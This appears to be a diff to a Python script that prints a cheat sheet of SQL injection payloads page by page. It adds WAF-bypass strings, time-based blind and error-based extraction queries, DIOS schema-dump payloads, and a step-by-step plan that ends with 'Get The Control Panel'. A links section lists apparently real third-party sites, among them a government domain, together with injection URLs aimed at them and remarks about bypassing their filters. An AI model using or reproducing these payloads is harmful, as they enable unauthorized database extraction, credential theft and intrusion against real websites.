@@ -39,7 +39,16 @@ note=O+"""
  |: Delete the variable number and add a slash  [/]
  |: Using Logical expressions  [and 1=1]
 -|----------------------------------------------------------------------------|-
-
+1- Single Quote ↳ '
+2- Double Quote ↳ "
+3- Letter ↳ a
+4- Adding Letter To Single Quote ↳ 'a Or To Double Quote ↳ "a
+5- Adding Dot . Befor The Variable And Then Adding Single Quote After ↳ ID=.10'
+6- Adding Dot . Befor The Variable And After The Variable IN The Same Time ↳ ID=.10.
+7- Adding Single Quote Befor Variable Number ↳ ID='10
+8- Delete The Variable Number And Just Adding Single Quote ↳ ID='
+9- Delete The Variable And Add Just Slash Condition ↳ =\
+10- Use ‫‪Logical‬‬ ‫‪Operator‬‬ ↳ And 1=1 , And 1=2
 """
 
 clear()
@@ -78,7 +87,7 @@ cat=.1 and 1=1 -- -
 ----------------------------------------------------------------------------
 cat=.2 order by 10 -- -
 ----------------------------------------------------------------------------
-cat= 3-.1GROUPBY1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 asc
+cat= 3-.1GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 asc
 ----------------------------------------------------------------------------
 cat=.4 union select version(),2-- -
 ----------------------------------------------------------------------------
@@ -94,6 +103,10 @@ cat=.8 union select group_concat(column_name)   +froM+InfORmaTion_scHema.cOlumnS
 ----------------------------------------------------------------------------
 cat=.9 union select group_concat(username,0x3a,password)    from member -- -
 ----------------------------------------------------------------------------
+show staff in source 
+-------------------------------------------------------------------------
+concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
+
 """
 
 
@@ -148,7 +161,23 @@ php?id=25' and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
 ----------------------------------------------------------------------------
 php?id=7 and .0UnIOn-- -%0ASeLeCt 1,2,3,4-- -
 ----------------------------------------------------------------------------
+php?id=7 div .0UnIOn-- -%0ASeLeCt 1,2,3,4-- -
+----------------------------------------------------------------------------
+AnD point(29,9) /*!50000UnIoN*/ /*!50000SeLeCt*/
+----------------------------------------------------------------------------
+' And .0union/**/distinct+select
+----------------------------------------------------------------------------
+' And/**/.0union/*%26*/distinctROW+select
+----------------------------------------------------------------------------
+%75%6e%69%6f%6e--%20-%0%73%65%6c%65%63%74
+ 
+union sele%63t
+ 
+%75nion %73elect
 
+and 0 /*!50000Union*/ /*!00000Select*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16`
+
+cat=5||!{f`id`}union-- a%0Aselect 1,2 -- -
 
 """
 
@@ -176,19 +205,16 @@ DIOS START #start normal
 ----------------------------------
 (select(@) from (select (@:=0x00),(select (@) from (__TA__) where (@) in (@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
 --------------------------------------------------------------------------------------------------------------------------
-# direct DIOS2 #start normal
---------------------------------------------------------------------------------------------------------------------------
-concat( @n_d:=0x00,@i:=0x00,@o:=0x00,if( benchmark( (select count(*) from information_schema.schemata), @o:=CONCAT(@o,(Select concat( 0x266e6273703b,LPAD(@n_d:=@n_d%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d7265643e3c623e,@i:=schema_name,0x3c2f623e20286e756d626572206f66207461626c657320696e2064617461626173653a20,@NumberOfDatabases:=(select count(*) from information_schema.tables where table_schema=@i),0x293c2f666f6e743e,0x3c62723e,
-concat(@n_t:=0x00,@tbl:=0x00,@out_tbl:=0x00,if( benchmark( @NumberOfDatabases,@out_tbl:=CONCAT( @out_tbl,( Select concat( repeat(0x266e6273703b,8),LPAD(@n_t:=@n_t%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d677265656e3e3c623e,@tbl:=table_name,0x3c2f623e20286e756d626572206f6620636f6c756d6e7320696e207461626c653a20,@NumberOfColumns:=(select count(*) from information_schema.columns where table_schema=@i and table_name=@tbl),0x293c2f666f6e743e,concat( @n_c:=0x00,@clm:=0x00,@clm_out:=0x00,if( benchmark( @NumberOfColumns,@clm_out:=CONCAT( @clm_out,0x3c62723e,repeat(0x266e6273703b ,16),LPAD(@n_c:=@n_c%2b1,3,0x30),0x2e20203c666f6e7420636f6c6f723d626c75653e,(Select (@clm:=column_name) from information_schema.columns where (table_name=@tbl) and column_name>@clm order by column_name LIMIT 1),0x3c2f666f6e743e))=0, @clm_out, 0x00), 0x3c62723e)) from information_schema.tables where table_schema=@i and table_name>@tbl order by table_name LIMIT 1)))=0, @out_tbl, 0x00))) from information_schema.schemata where schema_name>@i order by schema_name LIMIT 1)))=0,@o,0x00))
---------------------------------------------------------------------------------------------------------------------------
+=======================================================================================================================================================================
 concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=database())and@:=concat/**/
 (@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)
+=======================================================================================================================================================================
 
---------------------------------------------------------------------------------------------------------------------------
-#__TA__ #__C1__#__C2__
-----------------------------------
-(/*!50000select*/(@) /*!50000from*/ (/*!50000select*/ (@:=0x00),(/*!50000select*/ (@) /*!50000from*/ (__TA__) /*!50000where*/ (@) in
-(@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)"""
+union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- - 
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+"""
 
 
 clear()
@@ -526,14 +552,84 @@ or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--
 
 --------------
 { cll } mean windows system
-
 """
+
+
 
 clear()
 print(alpha)
 input("[Pres Enter]")
 
 
+WAF="""
+--------------------------------------------------------------------------------------------------------------------------
+WAF Bypassing By Using False Statement 
+--------------------------------------------------------------------------------------------------------------------------
+
+&id=polygon(10) union/**/DistinctRow select 1,2-- -
+&id=polygon(point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=polygon@' union/**/DistinctRow select 1,2-- -
+&id=@10 union/**/DistinctRow select 1,2-- -
+&id=@@new union/**/DistinctRow select 1,2-- -
+&id=@-.@union/**/DistinctRow select 1,2-- -
+&id=10 %26%26 NULL union/**/DistinctRow select 1,2-- -
+&id=@ Or 1<0 union/**/DistinctRow select 1,2-- -
+&id=@<0union/**/DistinctRow select 1,2-- -
+&id=10 And point(53,12) union/**/DistinctRow select 1,2-- -
+&id=10 And RADIANS(point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Polygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Multipolygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Linestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Multilinestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Geometrycollection(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And MOD(29,9) union/**/DistinctRow select 1,2-- -
+&id=10 And MOD(234, 10) union/**/DistinctRow select 1,2-- -
+&id=10 %26%26 MOD(29,9) union/**/DistinctRow select 1,2-- -
+&id={f -@} union/**/DistinctRow select 1,2-- -
+&id=10 IS NOT NULL=0 union/**/DistinctRow select 1,2-- -
+&id=10 And NAME_CONST(version(),0) union/**/DistinctRow select 1,2-- -
+&id=10 NOT LIKE 1 union/**/DistinctRow select 1,2-- -
+&id=10 IS NULL union/**/DistinctRow select 1,2-- -
+&id=10 IS FALSE union/**/DistinctRow select 1,2-- -
+&id=10 And 253 % 1 union/**/DistinctRow select 1,2-- -
+&id=10 And 253 %25 union/**/DistinctRow select 1,2-- -
+&id=10 || FALSE union/**/DistinctRow select 1,2-- -
+--------------------------------------------------------------------------------------------------------------------------
+%26%26 SIGN(-0) union/**/DistinctRow select 1,2-- -
+%26%26 FLOOR(-0.0) union/**/DistinctRow select 1,2-- -
+%26%26 CEILING(-0.23) union/**/DistinctRow select 1,2-- -
+%26%26 ROUND(-0.23) union/**/DistinctRow select 1,2-- -
+%26%26 EXP(-800) union/**/DistinctRow select 1,2-- -
+%26%26 LOG(-1) union/**/DistinctRow select 1,2-- -
+%26%26 LOG10(-100) union/**/DistinctRow select 1,2-- -
+%26%26 POW(0,-2) union/**/DistinctRow select 1,2-- -
+%26%26 SQRT(0) union/**/DistinctRow select 1,2-- -
+%26%26 ACOS(1.0001) union/**/DistinctRow select 1,2-- -
+%26%26 ASIN(0.2) union/**/DistinctRow select 1,2-- -
+%26%26 ATAN(-1,2) union/**/DistinctRow select 1,2-- -
+%26%26 COT(0) union/**/DistinctRow select 1,2-- -
+%26%26 RAND(0) union/**/DistinctRow select 1,2-- -
+%26%26 LEAST(2,0) union/**/DistinctRow select 1,2-- -
+%26%26 GREATEST(0,0) union/**/DistinctRow select 1,2-- -
+%26%26 RADIANS(0) union/**/DistinctRow select 1,2-- -
+%26%26 TRUNCATE(0.999,0) union/**/DistinctRow select 1,2-- -
+%26%26 TRUNCATE(0.0*100,0) union/**/DistinctRow select 1,2-- -
+And POWER(0,1) union/**/DistinctRow select 1,2-- -
+And POW(0,1) union/**/DistinctRow select 1,2-- -
+
+-------------
+Example
+-------------
+https://pizzacrust.com.pk/deals.php?id=polygon@" order by 100 asc-- -
+"""
+
+
+
+
+
+clear()
+print(waf)
+input("[Pres Enter]")
 
 
 
@@ -701,11 +797,58 @@ input("[Pres Enter]")
 
 
 
+Nulling=""" 
+Blind TIME BASED 
+And (sleep(0))
+And (sleep(25))
+And SLEEP(25)=1
+And SLEEP(25)=1 LIMIT 1
+And BENCHMARK(200000,id)
+%26%26 BENCHMARK(200000,id)
+And BENCHMARK(200000,md5(id))
+%26%26 BENCHMARK(200000,md5(id))
+And BENCHMARK(1000000,MD5('A'))
+And BENCHMARK(200000,md5(NOW())
+--------------------------------------------------------------------------------------------------------------------------
+Nulling The Column 
+--------------------------------------------------------------------------------------------------------------------------
+GHI&ID=10 union select 0x322d2d202d,2,3,4,5,6,7-- -
+GHI&ID=10 union select 1,IFNULL(0x3023,0),3,4,5,6,7-- -
+GHI&ID=10 union select 1,2,NULLIF(0x3023,1),4,5,6,7-- -
+GHI&ID=10 union select 1,2,3,IFNULL(NULL,10),5,6,7-- -
+GHI&ID=10 union select 1,2,3,4,IFNULL(1/0,'No'),6,7-- -
+GHI&ID=10 union select 1,2,3,4,5,IF(0.1<>0,1,0),7-- -
+HI&ID=10 union select 1,1,1,1,1,1,1-- -
+
+--------------------------------------------------------------------------------------------------------------------------
+# Other knowledge not to us #
+--------------------------------------------------------------------------------------------------------------------------
+id=.58'limit 1,1 union select Null,2,3-- -
+id=.58'limit 1,1 union select 1,Null,3-- -
+id=.58'limit 1,1 union select 1,2,Null-- -
+id=.58'limit 1,1 union select true,2,3-- -
+id=.58'limit 1,1 union select 1,true,3-- -
+id=.58'limit 1,1 union select 1,2,true-- -
+ --------------------------------------------------------------------------------------------------------------------------
+# Brute Forcing Columns #
+ --------------------------------------------------------------------------------------------------------------------------
+news.php?id=.58'and 0 union select 1111 -- -
+news.php?id=.58'and 0 union select 11111,2222-- -
+news.php?id=.58'and 0 union select 11111,2222,3333-- -
+news.php?id=.58'and 0 union select 11111,2222,3333,4444-- -
+"""
 
 
 
 
 
+
+
+
+
+clear()
+print(Nulling)
+input("[Pres Enter]")
 
 
 
@@ -794,9 +937,9 @@ sqlmap -u www.balabas.com.ua/buy.php?cat=1 --level 4 --risk 3 dbms=mysql -p cat 
 https://github.com/certix7/sqllite/blob/main/databases_FingerPrint
 
 
-
+-----------------------------------------------------------------
 ‫‪SQL‬‬ ‫‪Injection‬‬ ‫‪Closures‬‬ ‫‪Technic‬‬ ‫‪
-
+=================================================
 
 ‫http://www.InjectorBoy.GHT?id=1‬‬) ‫‪order‬‬ ‫‪by‬‬ ‫‪100--‬‬ ‫‪-‬‬
 
@@ -811,19 +954,20 @@ https://github.com/certix7/sqllite/blob/main/databases_FingerPrint
 
 ‫•‬ ‫‪Hidden‬‬ ‫‪Vlun‬‬ ‫‪
 
-‫‪www.Ahmed-El-Melegy.be/files/download/6.pdf‬‬
-
-‫‪Ahmed-El-Melegy.be/files/download/6'.pdf‬‬
-
-‫‪www.Ahmed-El-Melegy.be/files/download@/6'.pdf‬‬
-
+Well let's make a mess
+• my.ukrtelecom.ua/files/download@/6'.pdf
+• my.ukrtelecom.ua/files/FuckYou/6'.pdf
+• my.ukrtelecom.ua/files/1983/6'.pdf
+• my.ukrtelecom.ua/files/sqli/6'.pdf
 ‫
+
 ‫‪Update‬‬ ‫‪Statement‬‬ ‫‪Code‬‬
 ‫'*)‪'*updatexml(1,concat(0x1,version()),1‬‬
 ‫
 ‫‪www.Ahmed-El-Melegy.be/files/download@/6'*updatexml(1,concat(0x1,version()),1)*'.pdf‬‬
 
 
+my.ukrtelecom.ua/files/download@/6'*updatexml(1,concat(0x1,version()),1)*'.pdf
 
 
 ----------------------
@@ -918,7 +1062,7 @@ input("[Pres Enter]")
 clear()
 
 
-"""
+einfo="""
 -------------------------------------------------------------------------
 
 
@@ -969,7 +1113,7 @@ MID_SEPARATOR
 
 -------------------------------------------------------------------------
 
-DUMP Column
+DUMP Column |repeted
 -------------------------------------------------------------------------
 
 concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e
@@ -991,4 +1135,454 @@ a656374656420627920426c61436b20526f7365205b4748545d3a3a3a3a3a7e7e7e7e7e3c62723e3
 
 (select  (@x) from (select (@x:=0x00),(select (0) from  (information_schema.tables) where (0x00) in  (@x:=concat(@x,0x3c62723e,@tbl:=table_name,(Select CASE WHEN ( (select  count(*) from information_schema.columns where table_name=@tbl and  column_name like 0x25636172646e756d62657225)>0) THEN  0x3c666f6e7420636f6c6f723d677265656e3e3c623e202a2a2a20636172646e756d626572202a2a2a203c2f623e3c666f6e7420636f6c6f723d6
 26c75653e else 0x00 END)))))x)
+--------------------------------------------------------------------------------------------
+
+The Work Plans
+Contents
+➢ First, Look For a Target
+➢ Second, Test The Target For SQL Vulnerability
+➢ Note: Testing for Version
+--------------------------------------------------------------------------------------------
+Third, Find the Total Number of Columns
+• Key Issue Find the Total Number of Columns
+• 1- Another Method | Full Ask
+• 2- Another Method | INTO+At sign
+• 3- Another Method | PROCEDURE ANALYSE
+• 4- Another Method | The Waf Behaviour.
+--------------------------------------------------------------------------------------------
+➢ Four, Find The Number Of Vulnerable Columns
+➢ Five, Find The Table Names
+➢ Six, Find The Column Names
+➢ Seven, last Step Extract The uname and pass Column's Detail
+➢ Eight, Get The Control Panel
+
+
+-----------------------------------------------------------------------------------------
+increase with gro.up by like this
+
+%0Bgroup%0Bby%0A1%23
+%0Bgroup%0Bby%0A1,2%23
+%0Bgroup%0Bby%0A1,2,3%23
+%0Bgroup%0Bby%0A1,2,3,4%23
+%0Bgroup%0Bby%0A1,2,3,4,5%23
+%0Bgroup%0Bby%0A1,2,3,4,5,6%23
+
+
 """
+
+
+clear()
+print(einfo)
+input("[Pres Enter]")
+
+clear()
+
+
+
+level5='''
+
+
+ and polygon((select * from(SELECT ((SELECT * from (select * from information_schema.tables where table_schema=database() limit 0,1)x) = (select * from information_schema.tables where table_schema=database() limit 1) )``)o))
+
+ and polygon((select * from(SELECT ((SELECT * from (select * from information_schema.tables where table_schema=database() limit 14,1)x) = (select * from information_schema.tables where table_schema=database() limit 1) )``)o))
+
+ and polygon((select * from(SELECT ((SELECT * from (select * from siteadmin limit 0,1)x) = (select * from siteadmin limit 1) )``)o))
+
+
+-------------------------------------------------------------------------
+Routed Query 
+-------------------------------------------------------------------------
+
+0x + your hex code
+
+
+
+-------------------------------------------------------------------------
+Regular Injection 
+-------------------------------------------------------------------------
+cat=.1 ` union selct 1,2 `
+cat=.1  union selct 1,2 `
+
+
+` |backquote/backtick|
+
+
+
+-------------------------------------------------------------------------
+
+show staff in source 
+-------------------------------------------------------------------------
+
+
+concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
+
+
+
+
+
+-------------------------------------------------------------------------
+Flow Control [Function To Control ID Output]  |  Flow Control 
+-------------------------------------------------------------------------
+
+||!{BlackRose}
+
+
+And MOD(29,9) 
+
+www.binaryhexconverter.com/ascii-text-to-binary-converter
+
+
+concat%23aaaaaaaaaaa%0a(0b00101110001011100100111001100001011011010110010100100000001110100011101000100000010000010110100001101101011001010110010000100000010001010110110000100000010011010110010101101100011001010110011101111001,0b00111100011000100111001000111110,0b00101110,0b00101110,0b0101011001100101011100100111001101101001011011110110111000100000001110100011101000100000,0b00101110,version/*x*/(),0b00111100011000100111001000111110,0b00101110001011100101010101110011011001010111001000100000001110100011101000100000,user/*x*/(),0b00111100011000100111001000111110,0b0010111000101110010001000110000101110100011000010110001001100001011100110110010100100000001110100011101000100000,0b00101110,database/*x*/(),0b00111100011000100111001000111110,0b00111100011000100111001000111110,0b00101110001011100100010001101001011011110111001100100000001110100011101000100000,0b00111100011000100111001000111110,0b00111100011000100111001000111110)
+
+'''
+clear()
+print(level5)
+input("[Pres Enter]")
+
+clear()
+
+
+
+EXP='''
+1-Error Based SQL Injection Using EXP.
+
+' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
+table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -
+
+
+
+2-BIGINT Overflow Error Based SQL Injection.
+' or !(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where
+table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)-~0-- -
+
+'''
+
+
+
+
+clear()
+print(EXP)
+input("[Pres Enter]")
+
+clear()
+
+
+
+
+
+
+routed=""" 
+post data
+cookies base
+routed quary
+
+
+ """
+
+'''
+suck
+
+
+concat( @n_d:=0x00,@i:=0x00,@o:=0x00,if( benchmark( (select count(*) from information_schema.schemata), @o:=CONCAT(@o,(Select concat( 0x266e6273703b,LPAD(@n_d:=@n_d%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d7265643e3c623e,@i:=schema_name,0x3c2f623e20286e756d626572206f66207461626c657320696e2064617461626173653a20,@NumberOfDatabases:=(select count(*) from information_schema.tables where table_schema=@i),0x293c2f666f6e743e,0x3c62723e,
+concat(@n_t:=0x00,@tbl:=0x00,@out_tbl:=0x00,if( benchmark( @NumberOfDatabases,@out_tbl:=CONCAT( @out_tbl,( Select concat( repeat(0x266e6273703b,8),LPAD(@n_t:=@n_t%2b1,3,0x30),0x2e203c666f6e7420636f6c6f723d677265656e3e3c623e,@tbl:=table_name,0x3c2f623e20286e756d626572206f6620636f6c756d6e7320696e207461626c653a20,@NumberOfColumns:=(select count(*) from information_schema.columns where table_schema=@i and table_name=@tbl),0x293c2f666f6e743e,concat( @n_c:=0x00,@clm:=0x00,@clm_out:=0x00,if( benchmark( @NumberOfColumns,@clm_out:=CONCAT( @clm_out,0x3c62723e,repeat(0x266e6273703b ,16),LPAD(@n_c:=@n_c%2b1,3,0x30),0x2e20203c666f6e7420636f6c6f723d626c75653e,(Select (@clm:=column_name) from information_schema.columns where (table_name=@tbl) and column_name>@clm order by column_name LIMIT 1),0x3c2f666f6e743e))=0, @clm_out, 0x00), 0x3c62723e)) from information_schema.tables where table_schema=@i and table_name>@tbl order by table_name LIMIT 1)))=0, @out_tbl, 0x00))) from information_schema.schemata where schema_name>@i order by schema_name LIMIT 1)))=0,@o,0x00))
+
+
+
+#__TA__ #__C1__#__C2__
+----------------------------------
+(/*!50000select*/(@) /*!50000from*/ (/*!50000select*/ (@:=0x00),(/*!50000select*/ (@) /*!50000from*/ (__TA__) /*!50000where*/ (@) in
+(@:=concat(@,0x0a,__C1__,0x3a,__C2__))))a)
+---------------------------------------------------------------------------------------------------------------------------------------
+
+
+'''
+"""
+
+(@:=1)||@+group+by+concat((select+version()),0x7e,!@)+having+@||min(@:=0)-- -
+Second : Getting The Table Names
+
+
+(@:=1)||@+group+by+concat((select+table_name+from+information_schema.tables+whe​re+table_schema=database()
++limit+0,1),0x7e,!@)+having+@||min(@:=0)-- -
+
+Third: Getting the column names within the users table
+
+(@:=1)||@+group+by+concat((select+column_name+from+information_schema.columns+w​
+here+table_name=0xTABLEHEX+limit+0,1),0x7e,!@)+having+@||min(@:=0)-- -
+
+
+
+(@:=1)||@+group+by+concat((select+concat(COLUMN1,0x7e,COLUMN2)+from+TABLENAME+l​imit+0,1),0x7e,!@)
++having+@||min(@:=0)-- -
+
+"""
+
+links ="""
+
+https://www.fengrain.co.uk/news.php?id=.445 un<>ion se<>lect .1,.2,.3,.4,.5,.6,.7,.8,.9,con<>cat(0x223e3c62723e,version(),0x3c696d67207372633d22),.11,.12,.13,.14,.15,.16,.17,.18,.19,.20,.21,.22,.23,.24,.25,.26,.27,.28,.29,.30,.31,.32,.33,.34,.35,.36,.37,.38,.39,.40,.41,.42-- -
+
+
+
+
+
+1- Single Quote ↳ '
+2- Double Quote ↳ "
+3- Letter ↳ a
+4- Adding Letter To Single Quote ↳ 'a Or To Double Quote ↳ "a
+5- Adding Dot . Befor The Variable And Then Adding Single Quote After ↳ ID=.10'
+6- Adding Dot . Befor The Variable And After The Variable IN The Same Time ↳ ID=.10.
+7- Adding Single Quote Befor Variable Number ↳ ID='10
+8- Delete The Variable Number And Just Adding Single Quote ↳ ID='
+9- Delete The Variable And Add Just Slash Condition ↳ =\
+10- Use ‫‪Logical‬‬ ‫‪Operator‬‬ ↳ And 1=1 , And 1=2
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+https://jdclement.com/en/amis.php?id=73489"
+https://pizzacrust.com.pk/deals.php?id=38"
+ 
+http://www.alphaonenow.org/story.php?news_id=.5597
+http://www.alphaonenow.org/story.php?news_id=5597'
+http://www.alphaonenow.org/story.php?news_id=\
+http://www.alphaonenow.org/story.php?news_id=.5597 order by 100 -- -
+ 
+mahrukat.gov.sy/answercomplaints.php?id=12' >> waf Forbidden)
+mahrukat.gov.sy/answercomplaints.php?id=12'a >> bypassed :)
+http://mahrukat.gov.sy/answercomplaints.php?id=12a Work
+
+    http://mahrukat.gov.sy/answercomplaints.php?id=\ Error
+
+
+
+
+2- •◘╚╦☆ Work For SQLI WAF Bypassing By Using False Statement ☆╚╦◘•
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=polygon(10) union/**/DistinctRow select 1,2-- -
+&id=polygon(point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=polygon@' union/**/DistinctRow select 1,2-- -
+&id=@10 union/**/DistinctRow select 1,2-- -
+&id=@@new union/**/DistinctRow select 1,2-- -
+
+    &id=@-.@union/**/DistinctRow select 1,2-- -
+
+
+
+Example
+
+    Quote:
+    https://pizzacrust.com.pk/deals.php?id=polygon@" order by 100 asc-- -
+
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 %26%26 NULL union/**/DistinctRow select 1,2-- -
+&id=@ Or 1<0 union/**/DistinctRow select 1,2-- -
+
+    &id=@<0union/**/DistinctRow select 1,2-- -
+
+
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 And point(53,12) union/**/DistinctRow select 1,2-- -
+&id=10 And RADIANS(point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Polygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Multipolygon(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Linestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
+&id=10 And Multilinestring(Point(53,12)) union/**/DistinctRow select 1,2-- -
+
+    &id=10 And Geometrycollection(Point(53,12)) union/**/DistinctRow select 1,2-- -
+
+
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 And MOD(29,9) union/**/DistinctRow select 1,2-- -
+&id=10 And MOD(234, 10) union/**/DistinctRow select 1,2-- -
+
+    &id=10 %26%26 MOD(29,9) union/**/DistinctRow select 1,2-- -
+
+
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+    &id={f -@} union/**/DistinctRow select 1,2-- -
+
+
+
+# Normal Logical operators #
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+&id=10 IS NOT NULL=0 union/**/DistinctRow select 1,2-- -
+&id=10 And NAME_CONST(version(),0) union/**/DistinctRow select 1,2-- -
+&id=10 NOT LIKE 1 union/**/DistinctRow select 1,2-- -
+&id=10 IS NULL union/**/DistinctRow select 1,2-- -
+&id=10 IS FALSE union/**/DistinctRow select 1,2-- -
+&id=10 And 253 % 1 union/**/DistinctRow select 1,2-- -
+&id=10 And 253 %25 union/**/DistinctRow select 1,2-- -
+&id=10 || FALSE union/**/DistinctRow select 1,2-- -
+ 
+%26%26 SIGN(-0) union/**/DistinctRow select 1,2-- -
+%26%26 FLOOR(-0.0) union/**/DistinctRow select 1,2-- -
+%26%26 CEILING(-0.23) union/**/DistinctRow select 1,2-- -
+%26%26 ROUND(-0.23) union/**/DistinctRow select 1,2-- -
+%26%26 EXP(-800) union/**/DistinctRow select 1,2-- -
+%26%26 LOG(-1) union/**/DistinctRow select 1,2-- -
+%26%26 LOG10(-100) union/**/DistinctRow select 1,2-- -
+%26%26 POW(0,-2) union/**/DistinctRow select 1,2-- -
+%26%26 SQRT(0) union/**/DistinctRow select 1,2-- -
+%26%26 ACOS(1.0001) union/**/DistinctRow select 1,2-- -
+%26%26 ASIN(0.2) union/**/DistinctRow select 1,2-- -
+%26%26 ATAN(-1,2) union/**/DistinctRow select 1,2-- -
+%26%26 COT(0) union/**/DistinctRow select 1,2-- -
+%26%26 RAND(0) union/**/DistinctRow select 1,2-- -
+%26%26 LEAST(2,0) union/**/DistinctRow select 1,2-- -
+%26%26 GREATEST(0,0) union/**/DistinctRow select 1,2-- -
+%26%26 RADIANS(0) union/**/DistinctRow select 1,2-- -
+%26%26 TRUNCATE(0.999,0) union/**/DistinctRow select 1,2-- -
+%26%26 TRUNCATE(0.0*100,0) union/**/DistinctRow select 1,2-- -
+And POWER(0,1) union/**/DistinctRow select 1,2-- -
+
+    And POW(0,1) union/**/DistinctRow select 1,2-- -
+
+
+
+# Blind TIME BASED ⌛   |  8°-SQLI-☠ #
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+And (sleep(0))
+And (sleep(25))
+And SLEEP(25)=1
+And SLEEP(25)=1 LIMIT 1
+And BENCHMARK(200000,id)
+%26%26 BENCHMARK(200000,id)
+And BENCHMARK(200000,md5(id))
+%26%26 BENCHMARK(200000,md5(id))
+And BENCHMARK(1000000,MD5('A'))
+
+    And BENCHMARK(200000,md5(NOW())
+
+
+3- •◘╚╦☆ Nulling The Column ☆╚╦◘•
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+GHI&ID=10 union select 0x322d2d202d,2,3,4,5,6,7-- -
+GHI&ID=10 union select 1,IFNULL(0x3023,0),3,4,5,6,7-- -
+GHI&ID=10 union select 1,2,NULLIF(0x3023,1),4,5,6,7-- -
+GHI&ID=10 union select 1,2,3,IFNULL(NULL,10),5,6,7-- -
+GHI&ID=10 union select 1,2,3,4,IFNULL(1/0,'No'),6,7-- -
+GHI&ID=10 union select 1,2,3,4,5,IF(0.1<>0,1,0),7-- -
+
+    GHI&ID=10 union select 1,1,1,1,1,1,1-- -
+
+
+# Other knowledge not to us #
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+id=.58'limit 1,1 union select Null,2,3-- -
+id=.58'limit 1,1 union select 1,Null,3-- -
+id=.58'limit 1,1 union select 1,2,Null-- -
+ 
+id=.58'limit 1,1 union select true,2,3-- -
+id=.58'limit 1,1 union select 1,true,3-- -
+id=.58'limit 1,1 union select 1,2,true-- -
+ 
+# Brute Forcing Columns #
+ 
+news.php?id=.58'and 0 union select 1111 -- -
+news.php?id=.58'and 0 union select 11111,2222-- -
+news.php?id=.58'and 0 union select 11111,2222,3333-- -
+news.php?id=.58'and 0 union select 11111,2222,3333,4444-- -
+ 
+# multiple queries #
+ 
